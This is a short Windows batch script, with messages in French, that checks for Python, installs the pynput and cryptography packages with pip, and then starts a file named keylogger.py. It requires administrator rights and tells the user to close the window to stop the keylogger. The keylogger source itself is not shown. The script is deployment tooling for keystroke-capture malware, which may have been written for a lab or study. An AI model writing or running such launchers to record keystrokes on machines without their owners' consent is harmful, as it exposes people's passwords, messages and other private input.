@echo off
title INSTALLATION ROBINET (METHODE DIRECTE)
color 0B

echo.
echo ========================================================
echo      ETAPE FINALE : INSTALLATION ET LANCEMENT
echo ========================================================
echo [ATTENTION] Ce script DOIT etre execute en Administrateur.
echo.

:: 1. VERIFICATION PYTHON (On assume qu'il est installe apres la tentative precedente)
py -3 --version >nul 2>&1
if %errorlevel% neq 0 (
    color 0C
    echo [ERREUR FATALE] Python n'est pas detecte. Impossible de continuer.
    pause
    exit
) else (
    echo [OK] Python est present.
)


:: 2. DEPENDANCES ET LANCEMENT
echo.
echo [ACTION] Installation des dependances (pynput, cryptography)...
:: UTILISATION DE 'py -m pip' QUI EST PLUS FIABLE QUE 'pip' SEUL
py -3 -m pip install pynput cryptography

if %errorlevel% equ 0 (
    echo [SUCCES] Pynput installe.
    echo [LANCEMENT] Demarrage du Keylogger...
    echo.
    echo    >>> FERMEZ CETTE FENETRE POUR ARRETER LE KEYLOGGER <<<
    echo.
    
    :: Lancement du keylogger
    python keylogger.py
) else (
    color 0C
    echo [ERREUR CRITIQUE] Echec de l'installation de Pynput.
)

pause
